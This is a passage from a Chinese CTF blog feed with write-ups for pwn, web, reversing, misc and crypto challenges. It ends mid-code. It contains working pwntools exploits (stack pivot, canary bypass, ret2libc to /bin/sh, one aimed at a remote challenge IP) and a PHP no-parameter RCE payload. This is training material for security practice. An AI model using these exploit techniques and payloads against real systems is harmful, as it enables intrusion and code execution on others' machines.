class="line">    <span class="comment">#栈迁移，让rbp、rsp都指向一段可执行的bss1内存空间，泄露puts</span></span><br><span class="line">    v5 = <span class="string">&#x27;4196782&#x27;</span></span><br><span class="line">    bss1 = <span class="number">0x601a00</span></span><br><span class="line">    bss2 = <span class="number">0x601b00</span></span><br><span class="line">    p.sendline(v5)</span><br><span class="line">    p.recv()</span><br><span class="line">    payload2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">24</span> + p64(canary) + p64(bss1 + <span class="number">0x20</span>) + p64(<span class="number">0x40072E</span>)</span><br><span class="line">    p.send(payload2)</span><br><span class="line"></span><br><span class="line">    puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    pop_rdi_ret = <span class="number">0x400913</span></span><br><span class="line">    leave_ret = <span class="number">0x400759</span></span><br><span class="line">    payload3 = p64(pop_rdi_ret) + p64(puts_got) + p64(<span class="number">0x40086E</span>) + p64(canary) + p64(bss1-<span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">    p.send(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    <span class="comment">#print(hex(libc_base))</span></span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">    sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#ret2libc</span></span><br><span class="line">    payload4 = <span class="string">&quot;A&quot;</span>*<span class="number">24</span> + p64(canary) + p64(bss2 + <span class="number">0x20</span>) + p64(<span class="number">0x40072E</span>)</span><br><span class="line">    p.send(payload4)</span><br><span class="line"></span><br><span class="line">    payload5 = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr) + p64(canary) + p64(bss2 - <span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">    p.send(payload5)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<p>getshell！</p>
<p><img src="https://s2.loli.net/2021/12/16/uqatdD7CwS4x2Jc.png" alt="image-20211216174336534"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ROP</tag>
        <tag>Canary</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>长安战疫网络安全卫士守护赛wp</title>
    <url>/2022/01/10/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/</url>
    <content><![CDATA[<p><strong>其他题目整合到我的CTF仓库中了</strong></p>
<p><a href="https://github.com/Re1own/CTF/tree/main/Competition/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B">其他题目</a></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="八卦迷宫"><a href="#八卦迷宫" class="headerlink" title="八卦迷宫"></a>八卦迷宫</h3><p><a href="%E5%85%AB%E5%8D%A6%E8%BF%B7%E5%AE%AB.zip">题目下载</a></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71f3jb9j316q0u0aef.jpg" alt="image-20220108202918427"></p>
<p>flag为cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h3><p>根据题目提示，无参数的RCE，</p>
<p>源码提示括号里不能有参数，且禁止了含dir的相关函数、end等指针的移动和session的使用，但可以利用数组函数将传入的另一个值进行命令执行，编写脚本如下</p>
<p>import requests payload = “readfile(pos(array_reverse(current(get_defined_vars()))))”url = f’<a href="http://da077b2f.lxctf.net/?code=%7Bpayload%7D;&amp;a=flag.php&#39;">http://da077b2f.lxctf.net/?code={payload};&amp;a=flag.php&#39;</a> r = requests.get(url=url)print (r.text) </p>
<p>flag{dd5684123bd91016827ea1aca4890a0c}</p>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><p><a href="1_rTX2KEv.zip">题目下载</a></p>
<p>拿到题目后发现是.jar的文件，放入jd-gui逆向出java代码，代码逻辑很简单，就是对输入的字符串进行一个加密，加密函数为ttk，加密之后与字符串Jr_j11y_s1tug_g0_raq_g0_raq_pnml作比较，因此，解题思路就是把ttk函数的算法逆向，从而得出满足条件的用户输入值</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71nhvonj310m0u0ag4.jpg" alt="image-20220108194953827"></p>
<p>解密脚本：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] - <span class="number">13</span> &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; s[i] - <span class="number">13</span> &lt;= <span class="string">&#x27;m&#x27;</span>) &#123;</span><br><span class="line">            s[i] -= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s[i] - <span class="number">13</span> &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; s[i] - <span class="number">13</span> &lt;= <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">            s[i] -= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s[i] + <span class="number">13</span> &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; s[i] + <span class="number">13</span> &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            s[i] += <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s[i] + <span class="number">13</span> &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; s[i] + <span class="number">13</span> &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            s[i] += <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解出来是We_w11l_f1ght_t0_end_t0_end_cazy</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71myinnj31500393z0.jpg" alt="image-20220108195236862"></p>
<h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><p><a href="cute_doge.zip">题目下载</a></p>
<p>拿到题目是一个exe加了很多动态链接文件的东西，打开后怎么点也没法点出flag，用x64dbg调试也不太好去找弹出flag的窗口</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71fz1gqj30gv0ojmz7.jpg" alt="image-20220108195440376"></p>
<p>不过在ida中去搜字符串，发现有可疑的字符串</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71kprm7j31bf0qpqec.jpg" alt="image-20220108195614379"></p>
<p>对字符串”ZmxhZ3tDaDFuYV95eWRzX2Nhenl9”进行base64解密即可，得到flag{Ch1na_yyds_cazy}</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71m0kgvj316u07bgmo.jpg" alt="image-20220108195723146"></p>
<h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><p><a href="easy_py.cpython-38.pyc">题目下载</a></p>
<p>题目是一个pyc的文件，通过<code>uncompyle6 -o . .\easy_py.cpython-38.pyc</code>命令可以逆向得到py代码，解密的关键很直接，只需要输入的值经过encode_1和encode_2转化后为44, 100, 3, 50, 106, 90, 5, 102, 10, 112（即跟happy的值一样）就成功了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.3 (tags/v3.8.3:6f8c832, May 13 2020, 22:20:19) [MSC v.1925 32 bit (Intel)]</span></span><br><span class="line"><span class="comment"># Embedded file name: C:\Users\Administrator\Desktop\easy_py.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-12-28 15:45:17</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1099 bytes</span></span><br><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [</span><br><span class="line">     <span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="built_in">list</span>(f)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">            flag[j] = <span class="built_in">ord</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">            t1.start()</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag == Happy:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>因为题目是多线程，为了方便观察，我对encode_1和encode_2内部的以下几个地方增加了输出，打印当前的num值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;aaa&quot;</span> + <span class="built_in">str</span>(num))</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;haha&quot;</span> + <span class="built_in">str</span>(num))</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;bbb&quot;</span> + <span class="built_in">str</span>(num))</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;xixi&quot;</span> + <span class="built_in">str</span>(num))</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71hxe3jj307t0hjq34.jpg" alt="image-20220108200956558"></p>
<p>说明执行流程是这样的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag[<span class="number">9</span>] = flag[<span class="number">9</span>] ^ <span class="number">9</span></span><br><span class="line"></span><br><span class="line">flag[<span class="number">8</span>] = flag[<span class="number">8</span>] ^ flag[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">flag[<span class="number">7</span>] = flag[<span class="number">7</span>] ^ <span class="number">7</span></span><br><span class="line"></span><br><span class="line">flag[<span class="number">6</span>] = flag[<span class="number">6</span>] ^ flag[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">flag[<span class="number">5</span>] = flag[<span class="number">5</span>] ^ <span class="number">5</span></span><br><span class="line"></span><br><span class="line">flag[<span class="number">4</span>] = flag[<span class="number">4</span>] ^ flag[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">flag[<span class="number">3</span>] = flag[<span class="number">3</span>] ^ <span class="number">3</span></span><br><span class="line"></span><br><span class="line">flag[<span class="number">2</span>] = flag[<span class="number">2</span>] ^ flag[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">flag[<span class="number">1</span>] = flag[<span class="number">1</span>] ^ <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag[<span class="number">0</span>] = flag[<span class="number">0</span>] ^ flag[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>要解密出来只需要逆过来算一遍flag即可</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Happy = [<span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Happy)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        t = Happy[i] ^ Happy[i+<span class="number">1</span>]</span><br><span class="line">        flag.append(t)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Happy[i] ^ i</span><br><span class="line">        flag.append(t)</span><br><span class="line">flag_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    flag_str += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br></pre></td></tr></table></figure>

<p>最后解出来是He110_cazy</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71i9ltbj30ns03yq33.jpg" alt="image-20220108201556011"></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p><a href="pwn1">题目下载</a></p>
<p>题目开启了Full RELRO和NX保护</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71mhv83j30g006p74n.jpg" alt="image-20220108201751138"></p>
<p>反汇编后，明显看到read时让buf溢出了，可以覆盖掉函数调用前栈中rbp、rsp的值（但不是直接控制），而且还有buf（栈顶的实际地址泄露）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">52</span>]; <span class="comment">// [esp+0h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_80484FB();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift:%p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">256u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x8048540是get_shell的地址，里面直接有bin_sh和system，因此不用考虑ret2libc，此题关键在于弄清楚ecx干扰函数返回时的栈空间状态还原，与常规的不同，哪怕用了leave，最后还是取决于ecx，所以需要关注ecx的变化以及来源</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71k87bgj31h00u0qf1.jpg" alt="image-20220108201918273"></p>
<p>弄清楚这个点后，其实题目就是一个stack_pivot的问题，只需要根据结构构造出ebp、esp的值，如何构造？利用泄露的buf，根据ecx的来源ebp+var_4和去向ecx-4，把buf的首地址赋值为get_shell的地址，最后retn的时候就可以执行get_shell了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71l4nxoj30se0d7abu.jpg" alt="image-20220108202550935"></p>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;113.201.14.253&quot;</span>, <span class="number">16088</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./pwn1&quot;)</span></span><br><span class="line">buf_addr = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">buf_addr = buf_addr.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">buf_addr = buf_addr.replace(<span class="string">&quot;Gift:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(buf_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shell_addr = <span class="number">0x8048540</span></span><br><span class="line"></span><br><span class="line">payload = p32(shell_addr) + (<span class="number">52</span>-<span class="number">8</span>)*<span class="string">&#x27;A&#x27;</span> + p32(buf_addr+<span class="number">4</span>) + p32(buf_addr+<span class="number">4</span>) + p32(buf_addr+<span class="number">4</span>) + p32(buf_addr+<span class="number">4</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>flag{474b7f9219effe69530da4ad63c1752a}</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gya71lk0dxj30sz06t3z8.jpg" alt="image-20220108202803452"></p>
<h2 id="补题（持续更新）"><a href="#补题（持续更新）" class="headerlink" title="补题（持续更新）"></a>补题（持续更新）</h2><h3 id="西安加油（初见流量题）"><a href="#西安加油（初见流量题）" class="headerlink" title="西安加油（初见流量题）"></a>西安加油（初见流量题）</h3><p><a href="secret_s33EfBX_2.zip">题目下载</a></p>
<p>拿到题目是一道流量分析的文件，需要放到wireshark中分析</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyd1o1uaamj310g0u0ajn.jpg" alt="image-20220114113358034"></p>
<p>对流量包导出HTTP对象，发现只有hint.txt和secret.txt中有可以分析的内容</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyd1p573raj315i0u0ad6.jpg" alt="image-20220114113503035"></p>
<p>导出来hint.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HE2DAMZOOBXGOIDJOMQDACRYGA4DMLTQNZTSA2LTEAYQUNZTGAYS44DOM4QGS4ZAGIFDONBSGIXHA3THEBUXGIBTBIZTSNZYFZYG4ZZANFZSANAKHAZDMNROOBXGOIDJOMQDKCRXGY4DGLTQNZTSA2LTEA3AUNJUGEYC44DOM4QGS4ZAG4FDIMZWGUXHA3THEBUXGIBYBIZDIMRWFZYG4ZZANFZSAOIKHEYDKNROOBXGOIDJOMQDCMAKGMZDANJOOBXGOIDJOMQDCMIKGYZTMMJOOBXGOIDJOMQDCMQKHEYTMNZOOBXGOIDJOMQDCMYKGMYTSNJOOBXGOIDJOMQDCNAKGU4DKMROOBXGOIDJOMQDCNIKHEZDQMBOOBXGOIDJOMQDCNQKHE3TAMROOBXGOIDJOMQDCNYKHA2DENBOOBXGOIDJOMQDCOAKGE3DONJOOBXGOIDJOMQDCOIKGMYDCNBOOBXGOIDJOMQDEMAKG44TQNROOBXGOIDJOMQDEMIKHA2DGMROOBXGOIDJOMQDEMQKG4YTGOJOOBXGOIDJOMQDEMYKGQ3DKNJOOBXGOIDJOMQDENAKG4ZDKOBOOBXGOIDJOMQDENIKGM2TMNJOOBXGOIDJOMQDENQKGU2DINBOOBXGOIDJOMQDENYKG4ZTQNBOOBXGOIDJOMQDEOAKGIYDAMZOOBXGOIDJOMQDEOIKHA3DQOBOOBXGOIDJOMQDGMAKGU4TKNROOBXGOIDJOMQDGMIKGM2TAOJOOBXGOIDJOMQDGMQKHEYDENZOOBXGOIDJOMQDGMYKGE4TANJOOBXGOIDJOMQDGNAKGYYDQNJOOBXGOIDJOMQDGNIKG42DANROOBXGOIDJOMQDGNQKGE3DKMBOOBXGOIDJOMQDGNYKHA3DAMROOBXGOIDJOMQDGOAKHEZTONZOOBXGOIDJOMQDGOIKGEZTEMZOOBXGOIDJOMQDIMAKG4ZTEMJOOBXGOIDJOMQDIMIKGI3TINZOOBXGOIDJOMQDIMQKG4YTENJOOBXGOIDJOMQDIMYKGEZDEMBOOBXGOIDJOMQDINAKG4YDOOJOOBXGOIDJOMQDINIKGUYTOMROOBXGOIDJOMQDINQKGUYDOMBOOBXGOIDJOMQDINY=</span><br></pre></td></tr></table></figure>

<p>是一个base32加密的字符串，解出来是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9403.png is 0</span><br><span class="line">8086.png is 1</span><br><span class="line">7301.png is 2</span><br><span class="line">7422.png is 3</span><br><span class="line">3978.png is 4</span><br><span class="line">8266.png is 5</span><br><span class="line">7683.png is 6</span><br><span class="line">5410.png is 7</span><br><span class="line">4365.png is 8</span><br><span class="line">2426.png is 9</span><br><span class="line">9056.png is 10</span><br><span class="line">3205.png is 11</span><br><span class="line">6361.png is 12</span><br><span class="line">9167.png is 13</span><br><span class="line">3195.png is 14</span><br><span class="line">5852.png is 15</span><br><span class="line">9280.png is 16</span><br><span class="line">9702.png is 17</span><br><span class="line">8424.png is 18</span><br><span class="line">1675.png is 19</span><br><span class="line">3014.png is 20</span><br><span class="line">7986.png is 21</span><br><span class="line">8432.png is 22</span><br><span class="line">7139.png is 23</span><br><span class="line">4655.png is 24</span><br><span class="line">7258.png is 25</span><br><span class="line">3565.png is 26</span><br><span class="line">5444.png is 27</span><br><span class="line">7384.png is 28</span><br><span class="line">2003.png is 29</span><br><span class="line">8688.png is 30</span><br><span class="line">5956.png is 31</span><br><span class="line">3509.png is 32</span><br><span class="line">9027.png is 33</span><br><span class="line">1905.png is 34</span><br><span class="line">6085.png is 35</span><br><span class="line">7406.png is 36</span><br><span class="line">1650.png is 37</span><br><span class="line">8602.png is 38</span><br><span class="line">9377.png is 39</span><br><span class="line">1323.png is 40</span><br><span class="line">7321.png is 41</span><br><span class="line">2747.png is 42</span><br><span class="line">7125.png is 43</span><br><span class="line">1220.png is 44</span><br><span class="line">7079.png is 45</span><br><span class="line">5172.png is 46</span><br><span class="line">5070.png is 47</span><br></pre></td></tr></table></figure>

<p>base64解密secret.txt，看到开头的魔数，PK就是zip压缩包的头，然后在cyberchef中save output file</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyd41giz1mj31gm0u0k1p.jpg" alt="image-20220114125604965"></p>
<p>把cyberchef的内容复制到010中保存或者改下后缀名为zip，就能解压出很多图片了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyd44zqgkfj31aj0u07a4.jpg" alt="image-20220114125929841"></p>
<p>按照hint的png提示顺序，拼出来的图片就是flag了，cazy{make_xiAN_great_Again}</p>
<h3 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h3><p><a href="steg.zip">题目下载</a></p>
<p>爆破六位得到密码为220101，解压出来有两个文件，emojio.txt里面全是表情</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gybsv8ylx4j314u04yaai.jpg" alt="image-20220113094357257"></p>
<p>pyc隐写，在<strong>kali</strong>中执行命令<code>./stegosaurus -x ../steg.pyc</code>执行之后，得到TheKey:St3g1sV3ryFuNny</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/re1own/Desktop/misc/stegosaurus]</span><br><span class="line">└─<span class="comment"># ./stegosaurus -x ../steg.pyc                                                                                                                                                                                         1 ⨯</span></span><br><span class="line">Extracted payload: TheKey:St3g1sV3ryFuNny</span><br></pre></td></tr></table></figure>

<p>emoji解密网站：<a href="https://emoji-aes.miaotony.xyz/">https://emoji-aes.miaotony.xyz/</a></p>
<p>得到cazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke}</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gybswb0634j31vy0hc75r.jpg" alt="image-20220113094456766"></p>
<h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><p><a href="no_cry_no_can.zip">题目下载</a></p>
<p>题目给了一个py代码，看懂代码后，下面的代码最后输出的c其实是flag ^ key的值，所以要求原来的flag其实就是再和key进行一次异或操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt;= <span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_encrypt</span>(<span class="params">flag,key</span>):</span></span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag,key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 